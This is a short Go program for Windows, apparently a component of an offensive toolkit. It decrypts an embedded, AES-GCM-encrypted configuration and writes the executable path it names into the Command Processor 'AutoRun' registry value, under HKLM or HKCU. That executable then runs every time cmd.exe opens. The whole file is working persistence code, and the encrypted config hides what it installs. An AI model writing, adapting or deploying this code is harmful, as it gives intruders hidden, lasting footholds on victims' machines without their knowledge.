//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"encoding/json"

	"golang.org/x/sys/windows/registry"
)

//go:embed encrypt.txt
var encryptionKey string

var robin string
var RobinConfig RegistryConfig

type RegistryConfig struct {
	Key  string
	Path string
	Hive string
}

func decrypt(encryptionKey string) []byte {
	decoded, _ := base64.StdEncoding.DecodeString(robin)
	h := sha256.New()
	h.Write([]byte(encryptionKey))
	block, _ := aes.NewCipher(h.Sum(nil))
	aesGCM, _ := cipher.NewGCM(block)
	nonceSize := aesGCM.NonceSize()
	nonce, shellcode := decoded[:nonceSize], decoded[nonceSize:]
	plaintext, _ := aesGCM.Open(nil, nonce, shellcode, nil)
	return plaintext
}

func autorunModify(exePath string, hive string) {
	var regHive registry.Key

	if hive == "HKLM" {
		regHive = registry.LOCAL_MACHINE
	} else {
		regHive = registry.CURRENT_USER
	}
	registry.CreateKey(regHive, `SOFTWARE\Microsoft\Command Processor`, registry.WRITE)
	key, _ := registry.OpenKey(regHive, `SOFTWARE\Microsoft\Command Processor`, registry.WRITE)
	defer key.Close()

	key.SetStringValue("AutoRun", exePath)
}

func main() {
	decrypted := decrypt(encryptionKey)
	json.Unmarshal(decrypted, &RobinConfig)

	executable := RobinConfig.Path
	hive := RobinConfig.Hive

	autorunModify(executable, hive)
}
